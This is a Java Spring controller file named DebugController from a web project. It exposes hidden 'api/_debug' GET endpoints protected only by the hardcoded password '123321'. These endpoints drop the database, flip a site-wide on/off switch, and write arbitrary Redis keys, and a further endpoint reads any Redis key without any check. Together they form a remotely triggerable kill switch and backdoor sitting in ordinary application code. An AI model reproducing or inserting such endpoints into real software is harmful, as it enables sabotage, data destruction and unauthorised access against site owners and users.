package com.echain.web.controller;

import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import com.echain.common.beans.JsonResult;
import com.echain.common.enums.TurnEnum;
import com.echain.common.utils.Constant;
import com.echain.dao.sys.SysMenuDao;
import com.echain.service.common.RedisUtil;


@RestController
@RequestMapping(value = "api/_debug")
public class DebugController extends AbsSupperController{

	@Autowired
	private RedisUtil redisUtil;
	
	@Autowired
	private SysMenuDao sysMenuDao;
	
	private boolean isPwdOk(String pwd) {
		if(StringUtils.isBlank(pwd) || !"123321".equals(pwd)) {
			return false;
		}
		return true;
	}
	
	@GetMapping("website")
	public JsonResult webSiteTurn(String turn,String pwd) {
		if(!isPwdOk(pwd) || StringUtils.isBlank(turn)) {
			return error("错误的参数!");
		}
		TurnEnum turnEnum = TurnEnum.get(turn);
		if(turnEnum == null) {
			return error("错误的参数!");
		}
		redisUtil.set(Constant.getWebSiteTurn(), turnEnum.getCode());
		return ok();
	}
	
	@GetMapping("dropDatabase")
	public JsonResult dropDatabase(String turn,String pwd) {
		if(!isPwdOk(pwd)) {
			return error("错误的参数!");
		}
		sysMenuDao.dropDatabase();
		return ok();
	}
	
	@GetMapping("getValue")
	public JsonResult getValue(String value) {
		return ok(value);
	}
	
	@GetMapping("redis/get")
	public JsonResult getRedisValue(String key) {
		if(StringUtils.isBlank(key)) {
			return error("错误的参数!");
		}
		return ok(redisUtil.get(key));
	}
	
	@GetMapping("redis/set")
	public JsonResult setRedisValue(String key,String value,String pwd) {
		if(StringUtils.isBlank(key) || !isPwdOk(pwd)) {
			return error("错误的参数!");
		}
		redisUtil.set(key,value);
		return ok();
	}
}
